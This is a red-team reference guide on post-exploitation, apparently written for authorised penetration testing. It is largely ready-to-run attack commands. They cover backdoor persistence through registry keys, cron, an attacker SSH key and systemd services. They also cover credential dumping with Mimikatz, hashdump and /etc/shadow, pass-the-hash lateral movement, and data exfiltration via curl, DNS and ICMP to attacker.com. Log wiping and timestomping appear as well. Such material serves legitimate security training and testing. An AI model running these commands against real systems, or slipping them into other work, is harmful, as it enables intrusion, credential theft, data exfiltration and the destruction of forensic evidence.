# Post-Exploitation Techniques

Post-exploitation encompasses all activities performed after gaining initial access to a target system, including persistence, privilege escalation, lateral movement, and data collection.

---

## Post-Exploitation Framework

```
    POST-EXPLOITATION PHASES

    [Initial Access Gained]
              |
              v
    1. SITUATIONAL AWARENESS
    +----------------------------------+
    | System enumeration               |
    | User context identification      |
    | Network discovery                |
    +----------------------------------+
              |
              v
    2. PERSISTENCE
    +----------------------------------+
    | Maintain access                  |
    | Survive reboots                  |
    | Avoid detection                  |
    +----------------------------------+
              |
              v
    3. PRIVILEGE ESCALATION
    +----------------------------------+
    | Gain higher privileges           |
    | Domain admin / root              |
    +----------------------------------+
              |
              v
    4. CREDENTIAL HARVESTING
    +----------------------------------+
    | Extract credentials              |
    | Cached credentials               |
    | Password stores                  |
    +----------------------------------+
              |
              v
    5. LATERAL MOVEMENT
    +----------------------------------+
    | Move to other systems            |
    | Expand access                    |
    +----------------------------------+
              |
              v
    6. DATA COLLECTION
    +----------------------------------+
    | Identify sensitive data          |
    | Exfiltration planning            |
    +----------------------------------+
```

---

## Situational Awareness

### Windows Enumeration

```bash
# System information
systeminfo
hostname
whoami /all

# Network information
ipconfig /all
netstat -ano
arp -a
route print

# Users and groups
net users
net localgroup administrators
net user administrator

# Domain information
net config workstation
net view /domain
nltest /dclist:domain.com

# Running processes
tasklist /v
wmic process list brief

# Services
sc query
wmic service list brief
```

### Linux Enumeration

```bash
# System information
uname -a
cat /etc/os-release
hostname

# User information
id
whoami
cat /etc/passwd
cat /etc/shadow  # if readable

# Network information
ip addr
netstat -tulpn
ss -tulpn
cat /etc/hosts

# Processes
ps aux
pstree

# Scheduled tasks
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

### Meterpreter Enumeration

```bash
# System info
sysinfo
getuid
getpid

# Network
ipconfig
route
arp

# Processes
ps
migrate [PID]

# Users
run post/windows/gather/enum_logged_on_users

# Hashdump (requires SYSTEM)
hashdump
run post/windows/gather/credentials/credential_collector
```

---

## Persistence Mechanisms

### Windows Persistence

| Method | Description | Detection |
|--------|-------------|-----------|
| Registry Run Keys | Auto-start on login | Registry monitoring |
| Scheduled Tasks | Task Scheduler | Task audit |
| Services | Windows services | Service monitoring |
| WMI Subscriptions | WMI event triggers | WMI audit |
| DLL Hijacking | DLL search order | File monitoring |
| Startup Folder | User startup | Folder monitoring |

```bash
# Registry Run Key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled Task
schtasks /create /tn "Updater" /tr "C:\backdoor.exe" /sc onlogon

# Service creation
sc create backdoor binpath= "C:\backdoor.exe" start= auto

# WMI Subscription (PowerShell)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='EvilFilter';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime" AND TargetInstance.Hour=12'}
```

### Linux Persistence

| Method | Description | Detection |
|--------|-------------|-----------|
| Cron Jobs | Scheduled tasks | Cron monitoring |
| SSH Keys | Authorized keys | File integrity |
| Bashrc/Profile | Shell startup | File monitoring |
| Init Scripts | Boot scripts | File integrity |
| Systemd Services | System services | Service monitoring |
| LD_PRELOAD | Library injection | Process monitoring |

```bash
# Cron persistence
echo "* * * * * /tmp/backdoor.sh" | crontab -

# SSH key persistence
echo "ssh-rsa AAAA... attacker@host" >> ~/.ssh/authorized_keys

# Bashrc persistence
echo "/tmp/backdoor.sh &" >> ~/.bashrc

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/tmp/backdoor.sh

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
```

---

## Credential Harvesting

### Windows Credentials

```bash
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::sam
lsadump::dcsync /user:Administrator

# Meterpreter
hashdump
load kiwi
creds_all

# Credential Manager
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"

# SAM/SYSTEM extraction
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
```

### Linux Credentials

```bash
# Shadow file
cat /etc/shadow

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history

# Configuration files
grep -r password /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l password {} \; 2>/dev/null

# Memory extraction
strings /dev/mem | grep -i password
```

### Browser Credentials

```bash
# Chrome (Windows)
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox
~/.mozilla/firefox/*/logins.json
~/.mozilla/firefox/*/key4.db

# Extraction tools
lazagne all
SharpChrome
```

---

## Lateral Movement

### Windows Lateral Movement

| Technique | Protocol | Requirements |
|-----------|----------|--------------|
| PsExec | SMB (445) | Admin credentials |
| WMI | WMI (135) | Admin credentials |
| WinRM | WinRM (5985/5986) | Admin credentials |
| RDP | RDP (3389) | Valid credentials |
| Pass-the-Hash | SMB | NTLM hash |
| Pass-the-Ticket | Kerberos | TGT/TGS ticket |

```bash
# PsExec
psexec.py domain/user:password@target cmd.exe
impacket-psexec domain/user:password@target

# WMI
wmiexec.py domain/user:password@target
impacket-wmiexec domain/user:password@target

# Pass-the-Hash
pth-winexe -U domain/user%hash //target cmd.exe
impacket-psexec -hashes :NTHASH domain/user@target

# WinRM
evil-winrm -i target -u user -p password
Enter-PSSession -ComputerName target -Credential domain\user
```

### Linux Lateral Movement

| Technique | Protocol | Requirements |
|-----------|----------|--------------|
| SSH | SSH (22) | Credentials/keys |
| SSH Key Reuse | SSH (22) | Private key |
| Sudo Abuse | Local | Sudo access |
| NFS Shares | NFS | Exported shares |

```bash
# SSH with key
ssh -i id_rsa user@target

# SSH with credentials
sshpass -p 'password' ssh user@target

# Proxychains through pivot
proxychains ssh user@internal_target
```

---

## Data Collection

### Data Discovery

```bash
# Windows sensitive files
dir /s /b *password* *credential* *secret*
findstr /si password *.txt *.xml *.ini *.config

# Linux sensitive files
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null

# Database enumeration
SELECT table_name FROM information_schema.tables;
SHOW DATABASES;
```

### Data Staging

```bash
# Windows compression
powershell Compress-Archive -Path C:\data -DestinationPath C:\data.zip

# Linux compression
tar -czvf /tmp/data.tar.gz /path/to/data

# Base64 encoding
certutil -encode data.txt data.b64
base64 data.tar.gz > data.b64
```

### Exfiltration Methods

| Method | Protocol | Detection |
|--------|----------|-----------|
| HTTP/HTTPS | 80/443 | Proxy logs |
| DNS | 53 | DNS logs |
| ICMP | ICMP | Network monitoring |
| FTP | 21 | Network monitoring |
| Cloud Storage | HTTPS | DLP |
| Email | SMTP | Email logs |

```bash
# HTTP exfiltration
curl -X POST -F "file=@data.zip" http://attacker.com/upload

# DNS exfiltration
cat data.txt | xxd -p | xargs -I {} dig {}.attacker.com

# ICMP exfiltration
xxd -p -c 16 data.txt | while read line; do ping -c 1 -p $line attacker.com; done
```

---

## Covering Tracks

### Log Clearing

```bash
# Windows Event Logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Linux logs
echo > /var/log/auth.log
echo > /var/log/syslog
history -c

# Timestomping
timestomp backdoor.exe -m "01/01/2020 12:00:00"
touch -t 202001011200 backdoor.sh
```

### Anti-Forensics

| Technique | Purpose |
|-----------|---------|
| Log deletion | Remove evidence |
| Timestomping | Alter file times |
| Secure deletion | Prevent recovery |
| Memory cleanup | Remove artifacts |
| Process hollowing | Hide execution |

---

## Documentation

### Post-Exploitation Log

```
POST-EXPLOITATION RECORD

Initial Access:
- System: [Target]
- User: [Initial user]
- Method: [How accessed]

Actions Performed:
1. [Timestamp] - [Action] - [Result]
2. [Timestamp] - [Action] - [Result]

Credentials Obtained:
| Username | Hash/Password | Source |
|----------|---------------|--------|
| ...      | ...           | ...    |

Systems Accessed:
| System | Method | Access Level |
|--------|--------|--------------|
| ...    | ...    | ...          |

Data Accessed:
- [Description of data]
- [Location]
- [Sensitivity]

Persistence:
- Method: [Technique used]
- Location: [Path/Registry]
- Cleanup Required: [Yes/No]
```

---

## References

- MITRE ATT&CK Framework
- Red Team Field Manual
- Metasploit Unleashed

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2024-01-15 | Security Architecture | Initial release |
